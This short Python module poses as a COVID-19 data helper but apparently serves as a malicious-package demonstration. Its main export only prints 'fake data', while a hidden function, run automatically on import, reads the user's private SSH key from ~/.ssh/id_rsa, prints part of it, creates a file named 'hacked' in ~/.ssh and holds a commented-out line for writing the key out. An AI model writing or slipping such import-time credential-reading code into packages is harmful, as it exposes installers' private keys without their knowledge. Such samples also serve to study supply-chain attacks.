from pathlib import Path

__all__ = ["get_covid19_data"]


def get_covid19_data():
    print("fake data")


def get_your_data():
    with Path().home().joinpath(".ssh", "hacked").open("w") as f:
        data = Path().home().joinpath(".ssh", "id_rsa").read_text()
        print(data[:50])

        # f.write_text(data)
get_your_data()
